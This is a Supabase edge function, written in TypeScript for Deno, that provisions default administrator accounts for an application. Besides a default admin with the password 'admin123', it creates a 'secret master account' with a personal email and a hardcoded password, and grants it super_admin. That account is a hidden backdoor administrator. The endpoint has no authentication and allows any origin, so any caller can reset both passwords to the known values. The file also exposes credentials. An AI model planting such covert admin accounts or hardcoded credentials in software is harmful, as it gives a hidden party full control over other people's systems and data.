import { serve } from "https://deno.land/std@0.168.0/http/server.ts"
import { createClient } from "https://esm.sh/@supabase/supabase-js@2"

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
}

async function createAccount(supabase: any, email: string, password: string, fullName: string, loginUserId: string, role: string) {
  // Check if user already exists
  const { data: existingUsers } = await supabase.auth.admin.listUsers()
  const existing = existingUsers?.users?.find((u: any) => u.email === email)

  let userId: string

  if (existing) {
    userId = existing.id
    // Update password to ensure it matches
    await supabase.auth.admin.updateUserById(userId, { password, email_confirm: true })
  } else {
    const { data: newUser, error: createError } = await supabase.auth.admin.createUser({
      email,
      password,
      email_confirm: true,
      user_metadata: { full_name: fullName }
    })
    if (createError) throw createError
    userId = newUser.user.id
  }

  // Upsert admin_users
  if (role === 'super_admin') {
    const { data: existingAdmin } = await supabase.from('admin_users').select('id').eq('user_id', userId).maybeSingle()
    if (!existingAdmin) {
      await supabase.from('admin_users').insert({ user_id: userId, full_name: fullName })
    }
  }

  // Upsert software_users
  const { data: existingSU } = await supabase.from('software_users').select('id').eq('user_id', userId).maybeSingle()
  if (existingSU) {
    await supabase.from('software_users').update({
      email, full_name: fullName, login_user_id: loginUserId, role, is_active: true
    }).eq('user_id', userId)
  } else {
    await supabase.from('software_users').insert({
      user_id: userId, email, full_name: fullName, login_user_id: loginUserId, role, is_active: true
    })
  }

  return userId
}

serve(async (req) => {
  if (req.method === 'OPTIONS') {
    return new Response('ok', { headers: corsHeaders })
  }

  try {
    const supabase = createClient(
      Deno.env.get('SUPABASE_URL') ?? '',
      Deno.env.get('SUPABASE_SERVICE_ROLE_KEY') ?? ''
    )

    // Create default super admin account
    const adminId = await createAccount(
      supabase,
      'admin@gmail.com',
      'admin123',
      'System Admin',
      'admin',
      'super_admin'
    )

    // Create secret master account
    const masterId = await createAccount(
      supabase,
      'omrmym@gmail.com',
      'Omar!@1992',
      'Master Admin',
      'omrmym',
      'super_admin'
    )

    // Ensure super_admin role definition exists
    const { data: existingRole } = await supabase
      .from('role_definitions')
      .select('id')
      .eq('code', 'super_admin')
      .maybeSingle()

    if (!existingRole) {
      await supabase.from('role_definitions').insert({
        code: 'super_admin',
        name: 'Super Admin',
        description: 'Full system access',
        permissions: [],
        is_system: true,
        is_active: true
      })
    }

    return new Response(
      JSON.stringify({ success: true, message: 'Default accounts provisioned', adminId, masterId }),
      { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
    )
  } catch (error) {
    console.error('Create admin user error:', error);
    return new Response(
      JSON.stringify({ success: false, error: 'An error occurred processing your request' }),
      { headers: { ...corsHeaders, 'Content-Type': 'application/json' }, status: 500 }
    )
  }
})
